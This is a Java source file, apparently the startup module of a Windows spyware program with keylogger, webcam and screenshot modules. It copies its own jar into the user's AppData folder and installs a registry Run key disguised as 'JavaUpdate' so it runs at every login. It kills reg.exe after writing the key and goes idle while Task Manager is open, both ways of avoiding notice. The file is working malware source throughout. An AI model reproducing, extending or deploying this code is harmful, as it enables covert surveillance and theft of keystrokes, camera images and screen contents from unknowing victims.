package me.Eclipse.Modules;

import java.awt.Toolkit;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;
import java.net.URL;
import java.nio.file.Files;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.stream.Collectors;

import me.Eclipse.Brain;
import me.Eclipse.Modules.Impl.CameraModule;
import me.Eclipse.Modules.Impl.KeyLoggerModule;
import me.Eclipse.Modules.Impl.ScreenModule;
import me.Eclipse.Utils.FileData;
import me.Eclipse.Utils.Helper;
import me.Eclipse.Utils.Timer;

public class Start {
    private static boolean CameraFounded;
    private static File Data;
    private static File ModifiedEther;
    private static File Path;
    public static String Perms = "@ALL";
    private static boolean ScreenFounded;

    static {
        Data = new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Data.txt");
        ModifiedEther = new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Ether_" + Brain.Version + ".jar");

        try {
            Path = new File((new File(Brain.class.getProtectionDomain().getCodeSource().getLocation().toURI())).getPath());
        } catch (URISyntaxException var1) {
            ;
        }

    }

    public static void loadPreferences() throws IOException {
        KeyLoggerModule.CapsLock = Toolkit.getDefaultToolkit().getLockingKeyState(20);
        if (!FileData.Ether.exists()) {
            FileData.Ether.mkdir();
        }

        if (!Data.exists()) {
            Data.createNewFile();
            Date var0 = new Date();
            SimpleDateFormat var1 = new SimpleDateFormat("dd.MM.yyyy '|' hh:mm:ss");
            FileWriter var2 = new FileWriter(Data.toString());
            var2.write(var1.format(var0));
            var2.close();
        }

        Brain.Data = Helper.readFile(Data.toString());
        if (FileData.Keyboard.exists()) {
            FileData.Keyboard.delete();
        }

        if (ModifiedEther.exists()) {
            ModifiedEther.delete();
        }

        if (Path.exists()) {
            Files.copy(Path.toPath(), ModifiedEther.toPath());
            Runtime.getRuntime().exec("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v JavaUpdate /t REG_SZ /d \"" + ModifiedEther);
        }

        if (Helper.checkProcess("reg.exe")) {
            Runtime.getRuntime().exec("taskkill /F /IM reg.exe");
        }

        InputStream var3 = (new URL("jar:file:" + Path + "!/Permissions.txt")).openStream();
        Perms = (String) (new BufferedReader(new InputStreamReader(var3))).lines().collect(Collectors.joining("\n"));
    }

    public static void whileCircle() {
        if (Brain.TaskMGRMode) {
            try {
                if (Helper.checkProcess("taskmgr.exe")) {
                    return;
                }
            } catch (IOException var1) {
                ;
            }
        }

        if (!ScreenFounded) {
            if ((new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Screen_" + ScreenModule.ScreenCount + ".png")).exists()) {
                ++ScreenModule.ScreenCount;
            } else {
                --ScreenModule.ScreenCount;
                ScreenFounded = true;
            }
        }

        if (!CameraFounded) {
            if ((new File("C:\\Users\\" + FileData.Username + "\\AppData\\Local\\Ether\\Camera_" + CameraModule.CameraCount + ".jpg")).exists()) {
                ++CameraModule.CameraCount;
            } else {
                --CameraModule.CameraCount;
                CameraFounded = true;
            }
        }

        if (Timer.delay(60000.0F)) {
            ++Brain.Minutes;
            Timer.reset();
        }

    }
}
